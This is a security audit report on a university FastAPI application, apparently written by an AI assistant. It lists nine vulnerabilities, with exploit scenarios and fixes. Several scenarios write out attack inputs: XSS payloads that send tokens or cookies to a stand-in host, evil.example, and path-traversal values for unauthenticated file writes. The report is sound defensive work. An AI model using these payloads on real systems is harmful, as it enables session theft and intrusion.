# Security Audit — `web/` FastAPI Application

**Scope:** Full audit of `web/app.py`, `web/auth.py`, and every app under `web/apps/`
(excluding `web/apps/old apps/`, which is archived/dead code). This is broader than
just the recent diff — it covers the whole application, since that's what was
requested. No code was changed as part of this audit; all findings are reported
only.

**Method:** Four parallel investigations (core auth/session layer; the two
directory apps; file-upload/path-handling across the whole codebase; the
remaining seven apps), followed by manual verification of the most consequential
and any conflicting claims before inclusion here. Only findings with genuine,
concrete exploit paths are included — no theoretical/best-practice-only items,
no denial-of-service, no missing-hardening notes.

Findings are ordered by severity. For each: location, what's wrong, who can
trigger it and what they gain, and a recommended fix (not applied).

---

## CRITICAL

### 1. Hardcoded default secret allows full authentication bypass on Moodle SSO endpoints
- **File:** `web/app.py:2101` (secret), `:2105` and `:2193` (endpoints)
- **Issue:** `_MOODLE_SSO_SECRET = os.environ.get("LALI_MOODLE_SECRET", "cambiar-este-secreto-compartido")`. If the `LALI_MOODLE_SECRET` environment variable is not set in the deployment, the app silently falls back to the literal placeholder string `"cambiar-este-secreto-compartido"` ("change this shared secret"), which is committed in plaintext in `web/app.py` and echoed in `docs/moodle_bloque_eulalia.html` / `docs/moodle_bloque_lali.html`. This secret HMAC-signs two endpoints that are explicitly exempted from the normal auth middleware because their path contains `/public-agent/` (`app.py:172`): `/api/public-agent/eulalia/moodle-login` and `/api/public-agent/eulalia/invite-login`.
- **Exploit scenario:** `invite-login`'s key is `hmac_sha256(secret, username)[:16]` with **no expiry**. If the default secret is in effect, anyone who has read the (public, this-repo's) source can compute a valid key for *any* username — including a teacher/`docente` account — and call `GET /api/public-agent/eulalia/invite-login?user=<any_email>&key=<computed>` to receive a fully authenticated session for that user with zero credentials.
- **Recommendation:** Fail startup (don't silently fall back) if `LALI_MOODLE_SECRET` is unset in any non-local environment; rotate the value if the placeholder has ever been live; add expiry to `invite-login` keys to match `moodle-login`'s 5-minute window.

### 2. Unauthenticated, attacker-controlled path traversal file write via `/api/feedback`
- **File:** `web/app.py:7183-7188`
- **Issue:** The `agent_id` field of the feedback submission body is used directly to build a file path: `LOGS_DIR / f"{fb.agent_id}_feedback_tester.jsonl"`, with no validation against `..`, `/`, or `\`. This endpoint is explicitly carved out of the auth middleware (`"/api/feedback" != path` in the public-paths check at `app.py:172`), so it requires **no authentication at all**.
- **Exploit scenario:** `POST /api/feedback` with `{"agent_id": "../../../../some/other/path/x", "rating": "down", "mode": "tester", ...}` opens a file in append mode at a path fully controlled by the attacker, outside `LOGS_DIR`, and writes an attacker-controlled JSON line into it. Works identically with `..\` on the Windows host this repo is deployed on.
- **Recommendation:** Validate `agent_id` against a strict allow-list pattern (e.g. `^[A-Za-z0-9_-]+$`) before using it in a path, or resolve the final path and verify it's still inside `LOGS_DIR` before opening (the same pattern already used correctly elsewhere in `app.py` for a different file-serving route).

### 3. Unauthenticated stored XSS chain in Research Proposals (via a shared "guest" identity)
- **Files:** `web/apps/research_proposals/research_proposals.py:109,116,162,212`; `web/apps/research_proposals/static/index.html:740,764-765,783,813`
- **Issue — two compounding bugs:**
  1. `get_all_data`, `create_proposal`, `update_proposal`, and `delete_proposal` are gated only by `Depends(_require_auth)` (now `require_session` from `web/auth.py`), which resolves to a **fixed** guest session `{"username": "guest", ...}` for any caller with no token. Ownership checks compare `linked_username` to `session["username"]` — but every unauthenticated caller *is* `"guest"`, so any anonymous visitor's edit/delete check passes against every other anonymous visitor's proposals.
  2. The frontend's `diFull(label, value, isHtml)` helper defaults `isHtml` to `true` when omitted, and the calls rendering `p.topic`, `p.abstract`, and `p.partner_profile` all omit that argument — so these fully attacker-controlled fields are inserted as raw HTML into `innerHTML`, bypassing the `esc()` pattern used elsewhere in the same file.
- **Exploit scenario:** A completely unauthenticated attacker submits a proposal with `"topic": "<img src=x onerror=fetch('//evil.example/x?t='+localStorage.token)>"`. No login, no role, no CSRF token needed. The payload executes in the browser of **any** staff member — including `content_manager`/`superuser` — who opens that proposal's detail view, enabling session/token theft or any action the victim's session is authorized for.
- **Recommendation:** Require `_require_editor` (or at minimum a real login) for all four endpoints, or make guest sessions unable to satisfy any ownership check; fix `diFull` to default `isHtml` to `false` and pass raw text through `esc()`/`textContent` for `topic`/`abstract`/`partner_profile`.

---

## HIGH

### 4. Stored XSS via `javascript:` URI in the university website field
- **Backend:** `web/apps/new_directory/new_directory.py` — `UniversityUpdate`/`update_university` (~line 264-276) apply no scheme/format validation to `website`.
- **Frontend:** `web/apps/new_directory/static/index.html:687` — `'<a href="' + esc(u.website) + '" target="_blank" rel="noopener">'`.
- **Issue:** `esc()` only HTML-entity-encodes `& < > "`; it does not block the `javascript:` URI scheme, so a value like `javascript:fetch('//evil.example/'+document.cookie)` passes through unchanged into the `href` attribute.
- **Exploit scenario:** A `content_manager` — a role intentionally scoped to their own university elsewhere in this app — sets their university's website to a `javascript:` URI via `PUT /api/universities/{code}` (this endpoint has no per-university scoping, so it works for any university code, not just their own). Any other authenticated viewer, including a `superuser`, who opens the Universities tab and clicks the link executes attacker JS in the app's origin: session/token theft, or forging edit/delete requests using the victim's privileges. This is a `content_manager → superuser` privilege-escalation-via-XSS path, and it persists until someone edits the field back.
- **Recommendation:** Validate `website` server-side against an `http(s)://` allow-list before storing; as defense in depth, also reject non-`http(s)` schemes client-side before rendering the `href`.

### 5. Path traversal in `directory.py` image upload/read (Windows backslash bypass)
- **File:** `web/apps/directory/directory.py:347-384`
- **Issue:** `upload_user_image` builds `filename = f"{user_id}_{field_id}.{ext}"` directly from the `{user_id}`/`{field_id}` path parameters and a client-supplied file extension, then `os.path.join(IMAGES_DIR, filename)` and writes it; `get_image` does the same for reads. FastAPI/Starlette's default path-segment converter rejects a literal `/` in `{user_id}`/`{field_id}`, but it does **not** reject backslashes. On this repo's Windows deployment, a value like `user_id = "..\\..\\..\\static\\evil"` is accepted as a single path segment (no `/` present) and, once joined and opened, Windows resolves the embedded `..\` sequences and writes outside `IMAGES_DIR` — this is an attacker-controlled path plus attacker-controlled content (the "must be an image" check only trusts the client-supplied `Content-Type` header, with no magic-byte verification, so any content can be stored under any attacker-chosen extension).
- **Exploit scenario:** An authenticated user holding `_require_editor` (a broad role set that includes `teaching_staff`/`tester`, not just `superuser`) uploads a file with `user_id` crafted to traverse into a directory served by a different `StaticFiles` mount elsewhere in the app, with an `.html`/`.js` extension and script content, and a `Content-Type: image/png` header to pass the check. The important point for reproducibility: `get_image`'s own content-type coercion (which forces a safe `image/*` type based on extension whitelist) only protects requests that go through `GET /api/images/{filename}` — it does **not** protect the file if it lands inside a different, separately-mounted static directory, which would serve it with its real extension's content-type instead.
- **Recommendation:** Reject `user_id`/`field_id` values containing `.`, `/`, or `\`; validate the upload's actual content (magic bytes) rather than trusting `Content-Type`; restrict the stored extension to a fixed image whitelist (`jpg`/`png`/`gif`/`webp`) rather than the client-supplied one.

### 6. Cross-university IDOR: `content_manager` can create people under any university
- **File:** `web/apps/new_directory/new_directory.py`, `create_person` (~lines 305-343), guarded only by `_require_content_manager`.
- **Issue:** `update_person`/`delete_person` correctly restrict a `content_manager` to their own university via `_require_person_edit_access`, but `create_person` never applies an equivalent check — `PersonCreate.university` is validated only against the static list of known universities, not against the caller's own university.
- **Exploit scenario:** A `content_manager` scoped to one university (say UMA) can `POST /api/people` with `"university": "USPN"` and fabricate a directory entry — name, email, position — that appears in a different partner university's staff listing, e.g. planting a fake "IT Support" contact with an attacker-controlled email address that other universities' staff might trust and email.
- **Recommendation:** In `create_person`, require `body.university == _own_university(session, data)` for `content_manager` callers (mirroring the check already in `update_person`), unrestricted only for `superuser`.

---

## MEDIUM

### 7. Stored XSS in UMA Holiday Tracker (event destination/description)
- **File:** `web/apps/uma_holiday_tracker/static/index.html:955-956`
- **Issue:** `detailExtra.innerHTML` is built by directly concatenating `ev.destination`/`ev.description` (free text on a `comision_servicio` event, submitted via `POST /api/events`) without the `esc()` helper used everywhere else in this file.
- **Exploit scenario:** Any UMA staff member (`uninovis_staff`/`content_manager`/`superuser` with a `@uma.es` login — required to use this app at all) plants a script payload as their trip "destination"; it executes in the browser of every other UMA staff member who opens the shared calendar and views that event's detail, including `content_manager`/`superuser`.
- **Recommendation:** Route `destination`/`description` through the file's existing `esc()` helper before insertion.

### 8. Stored XSS + shared-guest-identity exposure in Event Tracker personal events
- **Files:** `web/apps/event_tracker/event_tracker.py:655-659` (`_require_auth_or_editor` skips the editor check for `visibility: "personal"`); `web/apps/event_tracker/static/index.html:1259-1261` (`descHtml` built from `ev.description` without escaping)
- **Issue:** Any caller — including an unauthenticated guest — can create a `"personal"` event without an editor role. Its description is later inserted unescaped into the detail modal. Because every unauthenticated caller resolves to the same literal `"guest"` session/identity (see Finding 3's root cause — this behavior pre-dates and is unrelated to this session's auth-helper consolidation; it was already present, identically, in each app's own original `_require_auth` copy), one anonymous visitor's planted script can execute for another anonymous visitor loading the shared "guest" personal calendar.
- **Exploit scenario:** Lower blast radius than Finding 3 since it stays within guest-to-guest scope rather than reaching authenticated staff, but it's still a concrete stored-XSS primitive reachable with zero authentication.
- **Recommendation:** Escape `description` before rendering; consider whether anonymous "personal" event creation should be allowed at all, given all anonymous users collide on one identity.

### 9. Sessions never expire, and tokens are accepted via URL query string
- **Files:** `web/auth.py:548-561` (`get_session`); `web/auth.py` (`get_token`) and equivalent per-app helpers accept `?token=` as a fallback to the `Authorization` header.
- **Issue:** `get_session()` never checks a session's age against any timeout — a token remains valid indefinitely until explicit logout or a server restart. Combined with tokens being accepted via a `?token=` query parameter (which routinely ends up in server access logs, proxy logs, and browser history/referrer headers), a token that leaks through any of those channels grants indefinite access with no way to detect or bound the exposure by time.
- **Recommendation:** Add a session TTL (sliding or absolute) enforced in `get_session()`; consider deprecating the query-param token fallback in favor of header-only auth where the calling context allows it (it's needed today for things like the iCal feed and direct-link flows, so at minimum shorten TTL for tokens ever used that way).

---

## Not flagged (checked and ruled out)

- **CORS:** no `CORSMiddleware`/`allow_origins` configuration exists anywhere in `web/` — this class of misconfiguration doesn't apply.
- **Password hashing / token generation:** PBKDF2 with 310k iterations and a per-user `secrets.token_hex(16)` salt, compared via `secrets.compare_digest`; session tokens use `secrets.token_hex(32)`/`secrets.token_urlsafe(32)`. All cryptographically sound. The one `import random` in `auth.py` is used only for non-security A/B study-condition balancing, never for tokens.
- **Static file mounts / a separate manual file-serving route:** all `StaticFiles` mounts point to fixed directories; the one hand-written file-serving route found sanitizes `..`/slashes/null bytes and does a resolved-path prefix check correctly.
- **Command/code injection, unsafe deserialization:** no `subprocess`, `os.system`, `os.popen`, `eval`/`exec` on request-derived data, `pickle`, or unsafe `yaml.load` found anywhere under `web/`. `unigracon.py`'s formula evaluator is a hand-rolled AST whitelist, not `eval`.
- **The 9 apps' unit reparent/delete/membership authorization** (`_require_unit_edit_access`, `_leads_unit_or_ancestor`, cycle prevention) added in this session's earlier work: scope checks are applied consistently on both source and destination units; no bypass found.
- **`researcher_connect.py`, `unigracon.py`, `mobility_planner.py`, `collaboration_dashboard.py`:** write endpoints correctly require an editor/staff role; their frontends consistently use `esc()`.
- **Other `UploadFile` handlers** (Excel/JSON/TSV imports, document uploads, audio analysis): none write attacker-named files to disk without stripping directory components first.

---

## Summary

| # | Finding | Severity | Auth required to trigger |
|---|---|---|---|
| 1 | Hardcoded default SSO secret → auth bypass | Critical | None (if secret unset) |
| 2 | Unauthenticated path-traversal file write (`/api/feedback`) | Critical | None |
| 3 | Unauthenticated stored-XSS chain (Research Proposals) | Critical | None |
| 4 | `javascript:` URI stored XSS (university website) | High | `content_manager` |
| 5 | Path traversal in image upload (Directory) | High | `_require_editor` |
| 6 | Cross-university IDOR on person creation | High | `content_manager` |
| 7 | Stored XSS (UMA Holiday Tracker) | Medium | UMA staff login |
| 8 | Stored XSS + shared-guest identity (Event Tracker) | Medium | None |
| 9 | No session expiry + query-string tokens | Medium | N/A (systemic) |

Three of the nine findings (4 and 6, plus arguably the pre-existing pattern
underlying 3 and 8) touch code from this session's own feature work on
`new_directory`; the remainder are pre-existing issues elsewhere in the
application surfaced by widening the audit to the whole `web/` codebase as
requested, rather than just the recent diff.
